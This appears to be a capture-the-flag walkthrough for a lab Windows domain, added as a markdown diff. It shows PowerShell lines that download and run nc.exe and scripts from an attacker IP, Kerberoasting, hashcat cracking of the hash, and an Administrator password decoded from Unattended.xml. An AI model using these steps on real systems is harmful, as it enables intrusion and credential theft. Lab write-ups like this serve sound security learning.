@@ -1,0 +1,106 @@
+# CORP
+
++ Upload the `nc.exe`
+```bash
+powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.4.37.160/nc.exe', 'C:\Windows\System32\spool\drivers\color\nc.exe')"
+```
+
++ Add this line `Invoke-Kerberoast -OutputFormat hashcat` on the last of file `Invoke-Kerberoast.ps1` before upload to target
+```bash
+iex(New-Object Net.WebClient).DownloadString('http://10.4.37.160/Invoke-Kerberoast.ps1')
+```
++ run command to List SPN
+```bash
+C:\Windows\System32\spool\drivers\color>setspn -T medin -Q */*
+Ldap Error(0x51 -- Server Down): ldap_connect
+Failed to retrieve DN for domain "medin" : 0x00000051
+Warning: No valid targets specified, reverting to current domain.
+CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
+        ldap/omega.corp.local/ForestDnsZones.corp.local
+        ldap/omega.corp.local/DomainDnsZones.corp.local
+        TERMSRV/OMEGA
+        TERMSRV/omega.corp.local
+        DNS/omega.corp.local
+        GC/omega.corp.local/corp.local
+        RestrictedKrbHost/omega.corp.local
+        RestrictedKrbHost/OMEGA
+        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
+        HOST/OMEGA/CORP
+        HOST/omega.corp.local/CORP
+        HOST/OMEGA
+        HOST/omega.corp.local
+        HOST/omega.corp.local/corp.local
+        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
+        ldap/OMEGA/CORP
+        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
+        ldap/omega.corp.local/CORP
+        ldap/OMEGA
+        ldap/omega.corp.local
+        ldap/omega.corp.local/corp.local
+CN=krbtgt,CN=Users,DC=corp,DC=local
+        kadmin/changepw
+CN=fela,CN=Users,DC=corp,DC=local
+        HTTP/fela
+        HOST/fela@corp.local
+        HTTP/fela@corp.local
+
+Existing SPN found!
+```
+
++ execute kerberoas 
+```bash
+C:\Windows\System32\spool\drivers\color>powershell -ep bypass;
+
+PS C:\Windows\System32\spool\drivers\color> iex(New-Object Net.WebClient).DownloadString('http://10.4.37.160/Invoke-Kerberoast.ps1')
+
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$2D9AAE97EBAF888987DECAD224C27081$82772B289D149C6AA91BC6F
+                       809CF9DC2EC91049E2B63387A4E4CB87AE555CBBF36AABCB64ABC48B4F2DAEA5636E6AFDBA3F0C0FD9067838C7E18CF5
+                       DE64AD01D7D7B8E798FA4D97E38FB02E95548EC988BE3F957BB8993FB563598B040875DDB501F007B190C725E3D20ECC
+                       E2913D406CCC8224D5C5492FF0E5D5577EBBC692EE24EB163B386F2BB715A27A0DE8D07D85D69157CE4B26979A31ABE7
+                       84466CB46ACCD6076C290D53525BA02B8CA1FC09BBE311C78487D9AC2C4F64344F038590DB9F09B15AB21F43959BA8B2
+                       81C4FF87F8D218B4F7097256945B53919A1851B1BDAD3692BBDB46D101271A84D7C80F597CCF2977C0371CE5E2151BE8
+                       59EEFD8E4541C970E67D30762ADD214A0C0F68A1BFA9DBEDD4C151D64CDB47EF6DE175D8726645B66C6681F49BF36735
+                       B0FB4C335B9A3C60CA36F06DB32D1C1D67AA189D7A3AA279782C04E92F685CB18FAB7B49A94CFCEA0E464607534F7D99
+                       9346C9FFDE466066EEB50BAF60275A10F3CF436DE1E73C627F5ABB0CAFC17A0B3CA73F7D3BA5B74355FE543567FBA7F2
+                       5BA116E72E42BA289DDE8247DFD490AF6F69BDA44FDDF9A79210521D0AB1FC66D8AD89A97CAB5573276F8FD44907C7F4
+                       09E54BAE566E5E92BEF30D38F8756621778C9EEBF1960B1C512EEA8262C2C5DA76193412957E802F852A5E78F3D539B0
+                       09A513B293809F6E3679032AE3E2C0C9A1E24FFFF208E53A50DB4EDCB1C725E8F911FED90577BF3218EDBBA1C7FD3FCF
+                       D3CA0D942472DBE81FAB481A9DCD97A37F64FE6B8F33323970979E06993975134ED4DED24D7DB64B18419BB5E8A81127
+                       3D672C0C13F7837A9EF8CC8C362D1156F424D585D6EEFF48CD69BFD3188993C0CDBCC6527CD73C99CAB072B7C4B53834
+                       CF324C5367A2FF626CE27565D39C18A995E3A70A8EC40779D9FFAD12A378CC9A13C41E25234E42254F6089BF4E2F8B2F
+                       5B15D67304E5F3340476DC0868E97FB949FECBAC8016DB8E9AB31ABBA3F5B65DFE5A3609FCFF451FFCD241A446C8DE7F
+                       B8B0E1F9666C9E6BD47232AB2C520E84EAC5BF1D38AC4B8B1BE7D0AF56D3C543263EABFA7BD0A1A5BA7A68406ABF5BAA
+                       BDA1A7AF2C4DD5947DA3133CB95F73119E798CE8E97ACA206FB74E94EBAF81F2B6B90E9AA899758525B03E66C43CF23A
+                       505BDCDB49FD13FCA3BECB979236D06965604D15E808EC00617600CC999E9838C05E675A48C06078F479B72EE1A3EF78
+                       F1152683150916BD586B76A185FE3647F2BBBEF1B227A8277130B60ECC53F28715334B8C6AB8F48011ABD43221D1AD9F
+                       7D7CBEE7469E5AEE3D6EA1383B036BD0DCE8CD5969725DE9A98D26C8CA9096D0CA90E91F1FC08CFAD09956F2F2AD8674
+                       55D897D10A07FFBFD92D4E8AE60F51E62CB1716F451
+SamAccountName       : fela
+DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
+ServicePrincipalName : HTTP/fela
+```
++ using hascat to decrypt
+```bash
+┌──(lodwig㉿kali)-[~]
+└─$ hashcat -m 13100 -a 0 fela.hash /usr/share/wordlists/rockyou.txt --force --show
+$krb5tgs$23$*fela$corp.local$HTTPfela*$bc1fe3e4cc81abb946f6eb0ad7051687$1d5dc1ef47a761e0903c3f60606dd2675ad35b1ec6738c87c593f6ce477190988d4225d1abe7616030e48380680535fe1ce3588f04adecdbd332dd0b5108391e2161e4bbce69aaf5708af88debb7a0ab18da31fc34ec6e1a40d25a25c21d51e82e3bba11277774d8bcb7c54b94ec94f1e3c4106e2537122c77a4bb444c02db0d01365c098662b6e416fb4620dc9ef83ba99b7f5a2c2f49687a19fd485115eaaa8a10e34042d93d407fb7d933a84a89068158f8450300010c118a90a89372c9be36fa35350e434084517d2d0557c1aa30953066acbe0e0122ada8652540ea346f073e7d396bb45469dd8a8e7036db806282a409ee6206f1226188e2716197594db9e35c89414cf744b3d0ab3d30000d717936ccfa67cc3af793ffff15357845a6c3159b5ab35f36ae38bf4849c2fee2e5963a8a39c9d32a1a5ff3425dcaa244fab1d66c31d62e052095085a342337adc6bd5cb928137c8b51a28809cc39f7bd59292b219fd05725f9352e493274448b9e91b847641775e642ff127954890fb3dc256508a9677bddd56da655fbb93574a0901258c45c4fc8c361a70c48cd907bcda0381a2f64e1668cdeef524c4cd8e77ee33650566496618404d186c7135c7041cc2c6df3dbd2f7cd28234b2e12e3491e0e6d0604d769eeca46fb5b14b6720ef2709e2f4fdb762dc3db9b7f36648f32c5a4e5fa21ddc970323053b037a274559b329ce46f8fe9a4a06d6e2833488d766df1aef8c593309f59cd8fb492f98f2b987656424dd116ac603d943ae680ea628b047f4cdd2e116bae5cfb6f7757ff5926265712076d255cb7843c746698ca027d2f26823e7646953b4912d839741fcd82edc0ae2af31070994c713295c43d1d9098bea2211e449c4e5012f51cb2743ff9603864050ae9ba5e21b09c1c7225cf8068f3351e8f26ecb4069acab198e97fe5ce98c18ecba9700d6f1b40166df254c8cfb9b02c4d19cae2b7ecf2c30fd6a0654be8939f83eb357b308827029a1fcc46a2de0de6e5171cf4e68e5574926cf550783e47acdac5cb67311c39c115c1b9e7affedfe5ba0ced9085a882a3559506341c611eaa950443acd64a05e2313ace848685b981795a91edc67fea48dfd081d4d6b2e6909a3df0c2762dee766062aa39ac8aaf610bc8ee09e7d1d54e65bf3dccd42530274f99ce37fc787db1da2282a12d248cf454dfa73fd54235a66132a2182e9ecd5c6a9100961e1ea57bf661e1721fd6f2de02eccd229c06d6da73316a09847aac3e0aa7c8e5d2a83ceb6ef20f057eb89c58a98c624d8de8ad0b7637b9bcf42468f216a4204b8f112f2eeaddf1b5b498a05a2e23b55c3c1d60addc58c664045838cc158daa5799518c635308267f9db6df842b39d294d603c5c2b7d6d951d3:rubenF124
+```
++ remote RDP using cred :`corp\fela:rubenF124` and show the flag.txt on Desktop
++ Upload the powerup `iex(New-Object Net.WebClient).DownloadString('http://10.4.37.160/PowerUp.ps1')`
+
+## PrivEsc
+```bash
+PS C:\Users\fela.CORP> type C:\Windows\Panther\Unattend\Unattended.xml
+<AutoLogon>
+    <Password>
+        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
+        <PlainText>false</PlainText>
+    </Password>
+    <Enabled>true</Enabled>
+    <Username>Administrator</Username>
+</AutoLogon>
+```
++ Decode base64 using `echo  dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ= | base64 -d` and got `tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T`
++ Login as `corp.local\administrator` with password `tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T` and read `flag.txt` on Desktop
